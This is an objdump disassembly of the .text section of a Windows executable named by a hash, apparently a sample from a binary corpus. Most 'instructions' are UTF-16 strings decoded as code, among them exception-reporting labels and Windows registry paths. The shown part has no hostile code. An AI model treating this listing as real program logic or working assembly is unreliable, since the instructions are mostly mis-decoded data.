
a455d32b8de771b493d3648bcbcac5edae2bb1f4062046e5d7ccd53e9d1e621e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	fcom   st(2)
  401006:	inc    eax
  401007:	add    BYTE PTR [eax-0x5fffbf25],al
  40100d:	fild   DWORD PTR [eax+0x0]
  401010:	rcr    bl,0x40
  401013:	add    al,dl
  401015:	fild   DWORD PTR [eax+0x0]
  401018:	lock fild DWORD PTR [eax+0x0]
  40101c:	add    ah,bl
  40101e:	inc    eax
  40101f:	add    BYTE PTR [eax],dl
  401021:	fadd   QWORD PTR [eax+0x0]
  401024:	xor    ah,bl
  401026:	inc    eax
	...
  40102f:	add    bl,dh
  401031:	rol    DWORD PTR [eax+0x0],1
  401034:	pop    ds
  401035:	rol    BYTE PTR [eax+0x0],cl
  401038:	mov    eax,ds:0xe80040d4
  40103d:	xlat   BYTE PTR ds:[ebx]
  40103e:	inc    eax
	...
  401053:	add    BYTE PTR [ebx-0x2e],cl
  401056:	adc    DWORD PTR [eax+0x0],edx
  401059:	add    BYTE PTR [eax],al
  40105b:	add    BYTE PTR [edx],al
  40105d:	add    BYTE PTR [eax],al
  40105f:	add    BYTE PTR [eax+eax*1],ah
  401062:	add    BYTE PTR [eax],al
  401064:	push   eax
  401065:	sbb    al,0x0
  401067:	add    BYTE PTR [eax+0x10],dl
	...
  401086:	add    BYTE PTR [eax],al
  401088:	dec    ebx
  401089:	add    BYTE PTR [ebp+0x0],al
  40108c:	push   edx
  40108d:	add    BYTE PTR [esi+0x0],cl
  401090:	inc    ebp
  401091:	add    BYTE PTR [eax+eax*1+0x33],cl
  401095:	add    BYTE PTR [edx],dh
  401097:	add    BYTE PTR [esi],ch
  401099:	add    BYTE PTR [eax+eax*1+0x4c],al
  40109d:	add    BYTE PTR [eax+eax*1+0x0],cl
  4010a1:	add    BYTE PTR [eax],al
  4010a3:	add    BYTE PTR [ebx+0x65],dl
  4010a6:	je     0x4010f8
  4010a8:	jb     0x401119
  4010aa:	arpl   WORD PTR [ebp+0x73],sp
  4010ad:	jae    0x4010f3
  4010af:	inc    ebp
  4010b0:	push   eax
  4010b1:	push   eax
  4010b2:	outs   dx,DWORD PTR ds:[esi]
  4010b3:	ins    BYTE PTR es:[edi],dx
  4010b4:	imul   esp,DWORD PTR [ebx+0x79],0x40e0e000
  4010bb:	add    BYTE PTR [eax],dh
  4010bd:	loope  0x4010ff
  4010bf:	add    BYTE PTR [eax],al
  4010c1:	add    BYTE PTR [eax],al
  4010c3:	add    BYTE PTR [eax+eax*1],bh
  4010c6:	push   ebp
  4010c7:	add    BYTE PTR [esi+0x0],ch
  4010ca:	imul   eax,DWORD PTR [eax],0x6e
  4010cd:	add    BYTE PTR [edi+0x0],ch
  4010d0:	ja     0x4010d2
  4010d2:	outs   dx,BYTE PTR ds:[esi]
  4010d3:	add    BYTE PTR [esi],bh
  4010d5:	add    BYTE PTR [eax],al
  4010d7:	add    BYTE PTR [edi],bh
  4010d9:	add    BYTE PTR ds:0x40007300,ah
  4010df:	add    BYTE PTR ds:0x40007300,ah
  4010e5:	add    BYTE PTR [eax+0x0],al
  4010e8:	add    BYTE PTR [eax],al
  4010ea:	add    BYTE PTR [eax],al
  4010ec:	das    
  4010ed:	add    BYTE PTR [edx+0x0],ah
  4010f0:	jae    0x4010f2
  4010f2:	arpl   WORD PTR [eax],ax
  4010f4:	das    
  4010f5:	add    BYTE PTR [ebp+0x0],ah
  4010f8:	outs   dx,BYTE PTR ds:[esi]
  4010f9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4010fd:	add    BYTE PTR [eax+eax*1+0x69],dh
  401101:	add    BYTE PTR [ebp+0x0],ah
  401104:	jae    0x401106
  401106:	add    BYTE PTR [eax],al
  401108:	das    
  401109:	add    BYTE PTR [edx+0x0],ah
  40110c:	jae    0x40110e
  40110e:	arpl   WORD PTR [eax],ax
  401110:	das    
  401111:	add    BYTE PTR [ebx+0x0],dh
  401114:	jb     0x401116
  401116:	arpl   WORD PTR [eax],ax
  401118:	das    
  401119:	add    BYTE PTR [eax],al
  40111b:	add    BYTE PTR [edi],ch
  40111d:	add    BYTE PTR [edx+0x0],ah
  401120:	jae    0x401122
  401122:	arpl   WORD PTR [eax],ax
  401124:	das    
  401125:	add    BYTE PTR [edi+0x0],ch
  401128:	jb     0x40112a
  40112a:	add    BYTE PTR fs:[ecx+0x0],ch
  40112e:	outs   dx,BYTE PTR ds:[esi]
  40112f:	add    BYTE PTR [esi+0x0],ah
  401132:	outs   dx,DWORD PTR ds:[esi]
  401133:	add    BYTE PTR [eax],al
  401135:	add    BYTE PTR [eax],al
  401137:	add    BYTE PTR [edi+0x0],dh
  40113a:	add    BYTE PTR [eax],al
  40113c:	shl    BYTE PTR [ebx+0x40],0x0
  401140:	loopne 0x4011a5
  401142:	inc    eax
  401143:	add    al,dh
  401145:	arpl   WORD PTR [eax+0x0],ax
  401148:	ja     0x40114a
  40114a:	popa   
  40114b:	add    BYTE PTR [edx+0x0],dh
  40114e:	outs   dx,BYTE PTR ds:[esi]
  40114f:	add    BYTE PTR [ecx+0x0],ch
  401152:	outs   dx,BYTE PTR ds:[esi]
  401153:	add    BYTE PTR [edi+0x0],ah
  401156:	add    BYTE PTR [eax],al
  401158:	add    BYTE PTR gs:[edx+0x0],dh
  40115c:	jb     0x40115e
  40115e:	outs   dx,DWORD PTR ds:[esi]
  40115f:	add    BYTE PTR [edx+0x0],dh
  401162:	add    BYTE PTR [eax],al
  401164:	inc    edx
  401165:	add    BYTE PTR [ebx+0x0],dl
  401168:	inc    ebx
  401169:	add    BYTE PTR [ebp+0x0],cl
  40116c:	inc    ecx
  40116d:	add    BYTE PTR [ebx+0x0],cl
  401170:	inc    ebp
  401171:	add    BYTE PTR [edx],bh
  401173:	add    BYTE PTR [eax],ah
  401175:	add    BYTE PTR ds:0x20007300,ah
  40117b:	add    BYTE PTR [edx+0x0],al
  40117e:	dec    ebx
  40117f:	add    BYTE PTR ds:0x20006400,ah
  401185:	add    BYTE PTR [edx],bh
  401187:	add    BYTE PTR [eax],ah
  401189:	add    BYTE PTR [eax],al
  40118b:	add    BYTE PTR [edx],bh
  40118d:	add    BYTE PTR [eax],ah
  40118f:	add    BYTE PTR ds:0x7300,ah
  401195:	add    BYTE PTR [eax],al
  401197:	add    BYTE PTR [edx],cl
  401199:	add    BYTE PTR [eax],al
  40119b:	add    BYTE PTR ds:0x28007300,ah
  4011a1:	add    BYTE PTR ds:0x29007500,ah
  4011a7:	add    BYTE PTR [eax],ah
  4011a9:	add    BYTE PTR [edx],bh
  4011ab:	add    BYTE PTR [eax],ah
  4011ad:	add    BYTE PTR ds:0x20007300,ah
  4011b3:	add    BYTE PTR [edx+0x0],al
  4011b6:	dec    ebx
  4011b7:	add    BYTE PTR ds:0x20006400,ah
  4011bd:	add    BYTE PTR [edx],bh
  4011bf:	add    BYTE PTR [eax],ah
  4011c1:	add    BYTE PTR [eax],al
  4011c3:	add    BYTE PTR [esi],ch
  4011c5:	add    BYTE PTR [eax],al
  4011c7:	add    BYTE PTR [ebx+0x0],dl
  4011ca:	outs   dx,DWORD PTR ds:[esi]
  4011cb:	add    BYTE PTR [esi+0x0],ah
  4011ce:	je     0x4011d0
  4011d0:	ja     0x4011d2
  4011d2:	popa   
  4011d3:	add    BYTE PTR [edx+0x0],dh
  4011d6:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4011db:	add    BYTE PTR [ecx+0x0],ch
  4011de:	arpl   WORD PTR [eax],ax
  4011e0:	jb     0x4011e2
  4011e2:	outs   dx,DWORD PTR ds:[esi]
  4011e3:	add    BYTE PTR [ebx+0x0],dh
  4011e6:	outs   dx,DWORD PTR ds:[esi]
  4011e7:	add    BYTE PTR [esi+0x0],ah
  4011ea:	je     0x4011ec
  4011ec:	pop    esp
  4011ed:	add    BYTE PTR [esi+0x0],dl
  4011f0:	imul   eax,DWORD PTR [eax],0x750073
  4011f6:	popa   
  4011f7:	add    BYTE PTR [eax+eax*1+0x53],ch
  4011fb:	add    BYTE PTR [eax+eax*1+0x75],dh
  4011ff:	add    BYTE PTR [eax+eax*1+0x69],ah
  401203:	add    BYTE PTR [edi+0x0],ch
  401206:	pop    esp
  401207:	add    BYTE PTR [ecx],bh
  401209:	add    BYTE PTR [esi],ch
  40120b:	add    BYTE PTR [eax],dh
  40120d:	add    BYTE PTR [eax+eax*1+0x47],bl
  401211:	add    BYTE PTR [ebp+0x0],ah
  401214:	outs   dx,BYTE PTR ds:[esi]
  401215:	add    BYTE PTR [ebp+0x0],ah
  401218:	jb     0x40121a
  40121a:	popa   
  40121b:	add    BYTE PTR [eax+eax*1+0x0],ch
  40121f:	add    BYTE PTR [ebp+0x0],dl
  401222:	jae    0x401224
  401224:	add    BYTE PTR gs:[edx+0x0],dh
  401228:	inc    ebx
  401229:	add    BYTE PTR [ecx+0x0],ah
  40122c:	outs   dx,BYTE PTR ds:[esi]
  40122d:	add    BYTE PTR [ecx+0x0],al
  401230:	jne    0x401232
  401232:	je     0x401234
  401234:	outs   dx,DWORD PTR ds:[esi]
  401235:	add    BYTE PTR [ebx+0x0],dl
  401238:	add    BYTE PTR gs:[esi+0x0],ch
  40123c:	add    BYTE PTR fs:[ebp+0x0],al
  401240:	jb     0x401242
  401242:	jb     0x401244
  401244:	outs   dx,DWORD PTR ds:[esi]
  401245:	add    BYTE PTR [edx+0x0],dh
  401248:	push   edx
  401249:	add    BYTE PTR [ebp+0x0],ah
  40124c:	jo     0x40124e
  40124e:	outs   dx,DWORD PTR ds:[esi]
  40124f:	add    BYTE PTR [edx+0x0],dh
  401252:	je     0x401254
  401254:	add    BYTE PTR [eax],al
  401256:	add    BYTE PTR [eax],al
  401258:	push   ebx
  401259:	add    BYTE PTR [edi+0x0],ch
  40125c:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  401261:	add    BYTE PTR [ecx+0x0],ah
  401264:	jb     0x401266
  401266:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40126b:	add    BYTE PTR [ecx+0x0],ch
  40126e:	arpl   WORD PTR [eax],ax
  401270:	jb     0x401272
  401272:	outs   dx,DWORD PTR ds:[esi]
  401273:	add    BYTE PTR [ebx+0x0],dh
  401276:	outs   dx,DWORD PTR ds:[esi]
  401277:	add    BYTE PTR [esi+0x0],ah
  40127a:	je     0x40127c
  40127c:	pop    esp
  40127d:	add    BYTE PTR [eax+0x0],dl
  401280:	inc    ebx
  401281:	add    BYTE PTR [eax+0x0],cl
  401284:	add    BYTE PTR gs:[ecx+0x0],ah
  401288:	ins    BYTE PTR es:[edi],dx
  401289:	add    BYTE PTR [eax+eax*1+0x68],dh
  40128d:	add    BYTE PTR [eax+eax*1+0x45],bl
  401291:	add    BYTE PTR [edx+0x0],dh
  401294:	jb     0x401296
  401296:	outs   dx,DWORD PTR ds:[esi]
  401297:	add    BYTE PTR [edx+0x0],dh
  40129a:	push   edx
  40129b:	add    BYTE PTR [ebp+0x0],ah
  40129e:	jo     0x4012a0
  4012a0:	outs   dx,DWORD PTR ds:[esi]
  4012a1:	add    BYTE PTR [edx+0x0],dh
  4012a4:	je     0x4012a6
  4012a6:	imul   eax,DWORD PTR [eax],0x67006e
  4012ac:	pop    esp
  4012ad:	add    BYTE PTR [eax+eax*1+0x57],al
  4012b1:	add    BYTE PTR [eax+eax*1+0x49],bl
  4012b5:	add    BYTE PTR [esi+0x0],ch
  4012b8:	jae    0x4012ba
  4012ba:	je     0x4012bc
  4012bc:	popa   
  4012bd:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4012c1:	add    BYTE PTR [ebp+0x0],ah
  4012c4:	add    BYTE PTR fs:[eax],al
  4012c7:	add    BYTE PTR [eax+eax*1+0x57],al
  4012cb:	add    BYTE PTR [eax],dh
  4012cd:	add    BYTE PTR [edx],dh
  4012cf:	add    BYTE PTR [eax],dh
  4012d1:	add    BYTE PTR [eax],dh
  4012d3:	add    BYTE PTR [eax],al
  4012d5:	add    BYTE PTR [eax],al
  4012d7:	add    BYTE PTR [eax+0x4b],cl
  4012da:	dec    esp
  4012db:	dec    ebp
  4012dc:	pop    esp
  4012dd:	push   ebx
  4012de:	outs   dx,DWORD PTR ds:[esi]
  4012df:	data16 je 0x401359
  4012e2:	popa   
  4012e3:	jb     0x40134a
  4012e5:	pop    esp
  4012e6:	dec    ebp
  4012e7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4012ee:	je     0x40134c
  4012f0:	dec    ecx
  4012f1:	outs   dx,BYTE PTR ds:[esi]
  4012f2:	je     0x401359
  4012f4:	jb     0x401364
  4012f6:	gs je  0x401319
  4012f9:	inc    ebp
  4012fa:	js     0x40136c
  4012fc:	ins    BYTE PTR es:[edi],dx
  4012fd:	outs   dx,DWORD PTR ds:[esi]
  4012fe:	jb     0x401365
  401300:	jb     0x40135e
  401302:	push   edx
  401303:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69746172
  40130c:	outs   dx,DWORD PTR ds:[esi]
  40130d:	outs   dx,BYTE PTR ds:[esi]
  40130e:	pop    esp
  40130f:	inc    esp
  401310:	imul   esp,DWORD PTR [edi+0x69],0x506c6174
  401317:	jb     0x401388
  401319:	fs jne 0x40137f
  40131c:	je     0x401367
  40131e:	inc    esp
  40131f:	add    BYTE PTR [eax+eax*1+0x77],ah
  401323:	add    BYTE PTR [edx],dh
  401325:	add    BYTE PTR [eax],dh
  401327:	add    BYTE PTR [esi],ch
  401329:	add    BYTE PTR [ebp+0x0],ah
  40132c:	js     0x40132e
  40132e:	add    BYTE PTR gs:[eax],ah
  401331:	add    BYTE PTR ds:0x20007800,ch
  401337:	add    BYTE PTR ds:0x20007300,ch
  40133d:	add    BYTE PTR ds:0x7500,ah
  401343:	add    BYTE PTR [eax],al
  401345:	add    BYTE PTR [eax],al
  401347:	add    BYTE PTR [edx],cl
  401349:	add    BYTE PTR [edx+0x0],al
  40134c:	push   ebx
  40134d:	add    BYTE PTR [ebx+0x0],al
  401350:	dec    ebp
  401351:	add    BYTE PTR [ecx+0x0],al
  401354:	dec    ebx
  401355:	add    BYTE PTR [ebp+0x0],al
  401358:	cmp    al,BYTE PTR [eax]
  40135a:	and    BYTE PTR [eax],al
  40135c:	add    BYTE PTR gs:[edx+0x0],dh
  401360:	jb     0x401362
  401362:	outs   dx,DWORD PTR ds:[esi]
  401363:	add    BYTE PTR [edx+0x0],dh
  401366:	and    BYTE PTR [eax],al
  401368:	inc    edx
  401369:	add    BYTE PTR [ebx+0x0],cl
  40136c:	xor    DWORD PTR [eax],eax
  40136e:	xor    eax,0x30003000
  401373:	add    BYTE PTR [edx],bh
  401375:	add    BYTE PTR [eax],ah
  401377:	add    BYTE PTR [ecx+0x0],cl
  40137a:	outs   dx,BYTE PTR ds:[esi]
  40137b:	add    BYTE PTR [eax+eax*1+0x65],dh
  40137f:	add    BYTE PTR [edx+0x0],dh
  401382:	outs   dx,BYTE PTR ds:[esi]
  401383:	add    BYTE PTR [ecx+0x0],ah
  401386:	ins    BYTE PTR es:[edi],dx
  401387:	add    BYTE PTR [eax],ah
  401389:	add    BYTE PTR [ebp+0x0],ah
  40138c:	jb     0x40138e
  40138e:	jb     0x401390
  401390:	outs   dx,DWORD PTR ds:[esi]
  401391:	add    BYTE PTR [edx+0x0],dh
  401394:	or     al,BYTE PTR [eax]
  401396:	add    BYTE PTR [eax],al
  401398:	cs inc ecx
  40139a:	inc    ebx
  40139b:	push   eax
  40139c:	add    BYTE PTR [eax],al
  40139e:	add    BYTE PTR [eax],al
  4013a0:	add    BYTE PTR gs:[edx+0x0],dh
  4013a4:	jb     0x4013a6
  4013a6:	outs   dx,DWORD PTR ds:[esi]
  4013a7:	add    BYTE PTR [edx+0x0],dh
  4013aa:	jb     0x4013ac
  4013ac:	add    BYTE PTR gs:[eax+0x0],dh
  4013b0:	outs   dx,DWORD PTR ds:[esi]
  4013b1:	add    BYTE PTR [edx+0x0],dh
  4013b4:	je     0x4013b6
  4013b6:	cmp    al,BYTE PTR [eax]
  4013b8:	outs   dx,BYTE PTR ds:[esi]
  4013b9:	add    BYTE PTR [edi+0x0],ch
  4013bc:	outs   dx,BYTE PTR ds:[esi]
  4013bd:	add    BYTE PTR [ebp+0x0],ah
  4013c0:	add    BYTE PTR [eax],al
  4013c2:	add    BYTE PTR [eax],al
  4013c4:	add    BYTE PTR gs:[edx+0x0],dh
  4013c8:	jb     0x4013ca
  4013ca:	outs   dx,DWORD PTR ds:[esi]
  4013cb:	add    BYTE PTR [edx+0x0],dh
  4013ce:	jb     0x4013d0
  4013d0:	add    BYTE PTR gs:[eax+0x0],dh
  4013d4:	outs   dx,DWORD PTR ds:[esi]
  4013d5:	add    BYTE PTR [edx+0x0],dh
  4013d8:	je     0x4013da
  4013da:	cmp    al,BYTE PTR [eax]
  4013dc:	jo     0x4013de
  4013de:	jb     0x4013e0
  4013e0:	outs   dx,DWORD PTR ds:[esi]
  4013e1:	add    BYTE PTR [ebp+0x0],ch
  4013e4:	jo     0x4013e6
  4013e6:	je     0x4013e8
  4013e8:	add    BYTE PTR [eax],al
  4013ea:	add    BYTE PTR [eax],al
  4013ec:	add    BYTE PTR gs:[edx+0x0],dh
  4013f0:	jb     0x4013f2
  4013f2:	outs   dx,DWORD PTR ds:[esi]
  4013f3:	add    BYTE PTR [edx+0x0],dh
  4013f6:	jb     0x4013f8
  4013f8:	add    BYTE PTR gs:[eax+0x0],dh
  4013fc:	outs   dx,DWORD PTR ds:[esi]
  4013fd:	add    BYTE PTR [edx+0x0],dh
  401400:	je     0x401402
  401402:	cmp    al,BYTE PTR [eax]
  401404:	jno    0x401406
  401406:	jne    0x401408
  401408:	add    BYTE PTR gs:[ebp+0x0],dh
  40140c:	add    BYTE PTR gs:[eax],al
  40140f:	add    BYTE PTR [ebp+0x0],ah
  401412:	jb     0x401414
  401414:	jb     0x401416
  401416:	outs   dx,DWORD PTR ds:[esi]
  401417:	add    BYTE PTR [edx+0x0],dh
  40141a:	jb     0x40141c
  40141c:	add    BYTE PTR gs:[eax+0x0],dh
  401420:	outs   dx,DWORD PTR ds:[esi]
  401421:	add    BYTE PTR [edx+0x0],dh
  401424:	je     0x401426
  401426:	cmp    al,BYTE PTR [eax]
  401428:	jae    0x40142a
  40142a:	add    BYTE PTR gs:[esi+0x0],ch
  40142e:	add    BYTE PTR fs:[eax],al
  401431:	add    BYTE PTR [eax],al
  401433:	add    BYTE PTR [ebp+0x0],ah
  401436:	jb     0x401438
  401438:	jb     0x40143a
  40143a:	outs   dx,DWORD PTR ds:[esi]
  40143b:	add    BYTE PTR [edx+0x0],dh
  40143e:	jb     0x401440
  401440:	add    BYTE PTR gs:[eax+0x0],dh
  401444:	outs   dx,DWORD PTR ds:[esi]
  401445:	add    BYTE PTR [edx+0x0],dh
  401448:	je     0x40144a
  40144a:	cmp    al,BYTE PTR [eax]
  40144c:	je     0x40144e
  40144e:	add    BYTE PTR gs:[ebx+0x0],dh
  401452:	je     0x401454
  401454:	add    BYTE PTR [eax],al
  401456:	add    BYTE PTR [eax],al
  401458:	push   0x74007400
  40145d:	add    BYTE PTR [eax+0x0],dh
  401460:	cmp    al,BYTE PTR [eax]
  401462:	das    
  401463:	add    BYTE PTR [edi],ch
  401465:	add    BYTE PTR [edi+0x0],ah
  401468:	outs   dx,DWORD PTR ds:[esi]
  401469:	add    BYTE PTR [esi],ch
  40146b:	add    BYTE PTR [ebp+0x0],ch
  40146e:	imul   eax,DWORD PTR [eax],0x720063
  401474:	outs   dx,DWORD PTR ds:[esi]
  401475:	add    BYTE PTR [ebx+0x0],dh
  401478:	outs   dx,DWORD PTR ds:[esi]
  401479:	add    BYTE PTR [esi+0x0],ah
  40147c:	je     0x40147e
  40147e:	add    BYTE PTR cs:[ebx+0x0],ah
  401482:	outs   dx,DWORD PTR ds:[esi]
  401483:	add    BYTE PTR [ebp+0x0],ch
  401486:	das    
  401487:	add    BYTE PTR [esi+0x0],ah
  40148a:	ja     0x40148c
  40148c:	ins    BYTE PTR es:[edi],dx
  40148d:	add    BYTE PTR [ecx+0x0],ch
  401490:	outs   dx,BYTE PTR ds:[esi]
  401491:	add    BYTE PTR [ebx+0x0],ch
  401494:	das    
  401495:	add    BYTE PTR [edi],bh
  401497:	add    BYTE PTR [eax+eax*1+0x69],cl
  40149b:	add    BYTE PTR [esi+0x0],ch
  40149e:	imul   eax,DWORD PTR [eax],0x49
  4014a1:	add    BYTE PTR [eax+eax*1+0x3d],ah
  4014a5:	add    BYTE PTR [edi],dh
  4014a7:	add    BYTE PTR [ecx],bh
  4014a9:	add    BYTE PTR ds:0x33003100,dh
	...
  4014b7:	add    BYTE PTR [eax+0x0],dl
  4014ba:	jb     0x4014bc
  4014bc:	outs   dx,DWORD PTR ds:[esi]
  4014bd:	add    BYTE PTR [ebx+0x0],ah
  4014c0:	add    BYTE PTR gs:[ebx+0x0],dh
  4014c4:	jae    0x4014c6
  4014c6:	imul   eax,DWORD PTR [eax],0x67006e
  4014cc:	cmp    al,BYTE PTR [eax]
  4014ce:	and    BYTE PTR [eax],al
  4014d0:	push   ebx
  4014d1:	add    BYTE PTR [edx+0x0],al
  4014d4:	push   edx
  4014d5:	add    BYTE PTR [eax],ah
  4014d7:	add    BYTE PTR [esi+0x0],ah
  4014da:	imul   eax,DWORD PTR [eax],0x65006c
  4014e0:	jae    0x4014e2
  4014e2:	and    BYTE PTR [eax],al
  4014e4:	popa   
  4014e5:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4014e9:	add    BYTE PTR [eax],ah
  4014eb:	add    BYTE PTR [eax+0x0],dh
  4014ee:	jb     0x4014f0
  4014f0:	outs   dx,DWORD PTR ds:[esi]
  4014f1:	add    BYTE PTR [ebx+0x0],ah
  4014f4:	add    BYTE PTR gs:[ebx+0x0],dh
  4014f8:	jae    0x4014fa
  4014fa:	add    BYTE PTR gs:[eax+eax*1+0x20],ah
  4014ff:	add    BYTE PTR ds:0x20002d00,ch
  401505:	add    BYTE PTR [edx+0x0],ah
  401508:	jne    0x40150a
  40150a:	imul   eax,DWORD PTR [eax],0x64006c
  401510:	imul   eax,DWORD PTR [eax],0x67006e
  401516:	and    BYTE PTR [eax],al
  401518:	add    BYTE PTR cs:[edx+0x0],ah
  40151c:	jae    0x40151e
  40151e:	arpl   WORD PTR [eax],ax
  401520:	and    BYTE PTR [eax],al
  401522:	add    BYTE PTR cs:[esi],ch
  401525:	add    BYTE PTR [edx],cl
	...
  40152f:	add    BYTE PTR [edx],cl
  401531:	add    BYTE PTR [eax],ah
  401533:	add    BYTE PTR [eax],ah
  401535:	add    BYTE PTR [esi+0x0],dl
  401538:	add    BYTE PTR gs:[edx+0x0],dh
  40153c:	jae    0x40153e
  40153e:	imul   eax,DWORD PTR [eax],0x6e006f
  401544:	and    BYTE PTR [eax],al
  401546:	xor    DWORD PTR [eax],eax
  401548:	xor    DWORD PTR [eax],eax
  40154a:	add    BYTE PTR cs:[eax],dh
  40154d:	add    BYTE PTR [eax],dh
  40154f:	add    BYTE PTR [esi],ch
  401551:	add    BYTE PTR ds:0x37003000,dh
  401557:	add    BYTE PTR [edx],dh
  401559:	add    BYTE PTR [edi],dh
  40155b:	add    BYTE PTR [esi],ch
  40155d:	add    BYTE PTR [ecx],dh
  40155f:	add    BYTE PTR [edx],cl
  401561:	add    BYTE PTR [edx],cl
  401563:	add    BYTE PTR [eax],ah
  401565:	add    BYTE PTR [eax],ah
  401567:	add    BYTE PTR [ebp+0x0],al
  40156a:	js     0x40156c
  40156c:	arpl   WORD PTR [eax],ax
  40156e:	add    BYTE PTR gs:[eax+0x0],dh
  401572:	je     0x401574
  401574:	imul   eax,DWORD PTR [eax],0x6e006f
  40157a:	inc    ebx
  40157b:	add    BYTE PTR [edi+0x0],ch
  40157e:	add    BYTE PTR fs:[ebp+0x0],ah
  401582:	and    BYTE PTR [eax],al
  401584:	and    BYTE PTR [eax],al
  401586:	and    BYTE PTR [eax],al
  401588:	and    BYTE PTR [eax],al
  40158a:	and    BYTE PTR [eax],al
  40158c:	and    BYTE PTR [eax],al
  40158e:	and    BYTE PTR [eax],al
  401590:	and    BYTE PTR [eax],al
  401592:	and    BYTE PTR [eax],al
  401594:	and    BYTE PTR [eax],al
  401596:	and    BYTE PTR [eax],al
  401598:	and    BYTE PTR [eax],al
  40159a:	cmp    eax,0x25002000
  40159f:	add    BYTE PTR [eax],dh
  4015a1:	add    BYTE PTR [eax],bh
  4015a3:	add    BYTE PTR [eax+0x0],bl
  4015a6:	or     al,BYTE PTR [eax]
  4015a8:	and    BYTE PTR [eax],al
  4015aa:	and    BYTE PTR [eax],al
  4015ac:	inc    ebp
  4015ad:	add    BYTE PTR [eax+0x0],bh
  4015b0:	arpl   WORD PTR [eax],ax
  4015b2:	add    BYTE PTR gs:[eax+0x0],dh
  4015b6:	je     0x4015b8
  4015b8:	imul   eax,DWORD PTR [eax],0x6e006f
  4015be:	inc    esi
  4015bf:	add    BYTE PTR [eax+eax*1+0x61],ch
  4015c3:	add    BYTE PTR [edi+0x0],ah
  4015c6:	jae    0x4015c8
  4015c8:	and    BYTE PTR [eax],al
  4015ca:	and    BYTE PTR [eax],al
  4015cc:	and    BYTE PTR [eax],al
  4015ce:	and    BYTE PTR [eax],al
  4015d0:	and    BYTE PTR [eax],al
  4015d2:	and    BYTE PTR [eax],al
  4015d4:	and    BYTE PTR [eax],al
  4015d6:	and    BYTE PTR [eax],al
  4015d8:	and    BYTE PTR [eax],al
  4015da:	and    BYTE PTR [eax],al
  4015dc:	and    BYTE PTR [eax],al
  4015de:	cmp    eax,0x25002000
  4015e3:	add    BYTE PTR [eax],dh
  4015e5:	add    BYTE PTR [eax],bh
  4015e7:	add    BYTE PTR [eax+0x0],bl
  4015ea:	or     al,BYTE PTR [eax]
  4015ec:	and    BYTE PTR [eax],al
  4015ee:	and    BYTE PTR [eax],al
  4015f0:	inc    ebp
  4015f1:	add    BYTE PTR [eax+0x0],bh
  4015f4:	arpl   WORD PTR [eax],ax
  4015f6:	add    BYTE PTR gs:[eax+0x0],dh
  4015fa:	je     0x4015fc
  4015fc:	imul   eax,DWORD PTR [eax],0x6e006f
  401602:	inc    ecx
  401603:	add    BYTE PTR [eax+eax*1+0x64],ah
  401607:	add    BYTE PTR [edx+0x0],dh
  40160a:	add    BYTE PTR gs:[ebx+0x0],dh
  40160e:	jae    0x401610
  401610:	and    BYTE PTR [eax],al
  401612:	and    BYTE PTR [eax],al
  401614:	and    BYTE PTR [eax],al
  401616:	and    BYTE PTR [eax],al
  401618:	and    BYTE PTR [eax],al
  40161a:	and    BYTE PTR [eax],al
  40161c:	and    BYTE PTR [eax],al
  40161e:	and    BYTE PTR [eax],al
  401620:	and    BYTE PTR [eax],al
  401622:	cmp    eax,0x25002000
  401627:	add    BYTE PTR [eax+0x0],dh
  40162a:	add    BYTE PTR [eax],al
  40162c:	and    BYTE PTR [eax],al
  40162e:	sub    BYTE PTR [eax],al
  401630:	and    eax,0x29007000
  401635:	add    BYTE PTR [eax],ah
  401637:	add    BYTE PTR [edx],ah
  401639:	add    BYTE PTR ds:0x22007300,ah
	...
  401647:	add    BYTE PTR [edx],cl
  401649:	add    BYTE PTR [eax],ah
  40164b:	add    BYTE PTR [eax],ah
  40164d:	add    BYTE PTR [esi+0x0],cl
  401650:	jne    0x401652
  401652:	ins    DWORD PTR es:[edi],dx
  401653:	add    BYTE PTR [edx+0x0],ah
  401656:	add    BYTE PTR gs:[edx+0x0],dh
  40165a:	push   eax
  40165b:	add    BYTE PTR [ecx+0x0],ah
  40165e:	jb     0x401660
  401660:	popa   
  401661:	add    BYTE PTR [ebp+0x0],ch
  401664:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  401669:	add    BYTE PTR [edx+0x0],dh
  40166c:	jae    0x40166e
  40166e:	and    BYTE PTR [eax],al
  401670:	and    BYTE PTR [eax],al
  401672:	and    BYTE PTR [eax],al
  401674:	and    BYTE PTR [eax],al
  401676:	and    BYTE PTR [eax],al
  401678:	and    BYTE PTR [eax],al
  40167a:	and    BYTE PTR [eax],al
  40167c:	and    BYTE PTR [eax],al
  40167e:	and    BYTE PTR [eax],al
  401680:	cmp    eax,0x25002000
  401685:	add    BYTE PTR [eax],dh
  401687:	add    BYTE PTR [eax],bh
  401689:	add    BYTE PTR [eax+0x0],bl
  40168c:	or     al,BYTE PTR [eax]
  40168e:	add    BYTE PTR [eax],al
  401690:	and    BYTE PTR [eax],al
  401692:	and    BYTE PTR [eax],al
  401694:	inc    ebp
  401695:	add    BYTE PTR [eax+0x0],bh
  401698:	arpl   WORD PTR [eax],ax
  40169a:	add    BYTE PTR gs:[eax+0x0],dh
  40169e:	je     0x4016a0
  4016a0:	imul   eax,DWORD PTR [eax],0x6e006f
  4016a6:	dec    ecx
  4016a7:	add    BYTE PTR [esi+0x0],ch
  4016aa:	data16 add BYTE PTR [edi+0x0],ch
  4016ae:	jb     0x4016b0
  4016b0:	ins    DWORD PTR es:[edi],dx
  4016b1:	add    BYTE PTR [ecx+0x0],ah
  4016b4:	je     0x4016b6
  4016b6:	imul   eax,DWORD PTR [eax],0x6e006f
  4016bc:	pop    ebx
  4016bd:	add    BYTE PTR ds:0x75003200,ah
  4016c3:	add    BYTE PTR [ebp+0x0],bl
  4016c6:	and    BYTE PTR [eax],al
  4016c8:	cmp    eax,0x25002000
  4016cd:	add    BYTE PTR [eax+0x0],dh
  4016d0:	or     al,BYTE PTR [eax]
  4016d2:	add    BYTE PTR [eax],al
  4016d4:	add    BYTE PTR [eax],al
  4016d6:	add    BYTE PTR [eax],al
